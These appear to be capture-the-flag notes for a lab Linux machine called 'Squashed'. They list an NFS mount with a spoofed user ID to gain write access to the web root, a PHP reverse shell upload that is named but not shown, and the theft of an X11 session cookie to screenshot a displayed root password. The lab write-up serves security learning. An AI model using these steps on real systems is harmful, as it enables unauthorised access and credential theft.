# Squashed

| Name      | IP           | Difficulty | OS    |
| ------ | ------------ | ---------- | ----- |
| squashed | 10.10.11.191 | Easy       | Linux |

## NMAP

| HOST         | PORT | PROTO | SERVICE      | VERSION                 |
| ------------ | ---- | ----- | ------------ | ----------------------- |
| 10.10.11.191 | 111  | tcp   | nfs          | 2-4                     |
| 10.10.11.191 | 2049 | tcp   | nfs          | 3-4                     |
| 10.10.11.191 | 22   | tcp   | OpenSSH      | 8.2p1 Ubuntu 4ubuntu0.5 |
| 10.10.11.191 | 80   | tcp   | Apache httpd | 2.4.41                  |

## HEADERS

```
HTTP/1.1 200 OK
Date: Wed, 05 Jul 2023 22:56:30 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 27 Dec 2022 15:35:01 GMT
ETag: "7f14-5f0d0fec87768"
Accept-Ranges: bytes   
Content-Length: 32532
Vary: Accept-Encoding
Content-Type: text/html
```

## DIRECTORIES

- /home/ross 
- /var/www/html

## USERS


## NOTES

- `shomount -e 10.10.11.191`
- /home/ross    
- /var/www/html 
- mount ross directory `sudo mount -t nfs 10.10.11.191:/home/ross /tmp/mnt -nolock`
- nothing
- cant mount ``/var/www/html`
- add new user that can access it
````
sudo useradd ross
sudo usermod -u 2017 ross
sudo groupmod -g 2017
su ross
````
- directory is writable and the site runs php
- Upload PHP reverse shell and get shell as alex
- open webserver as ross and download .Xauthority as alex
- `XAUTHORITY=/tmp/.Xauthority xwd -root -screen -silent -display :0 > /tmp/out.xwd
- move it to `/var/www/html`
- mount it and move it out 
- use the password in the screenshot
- `su -`
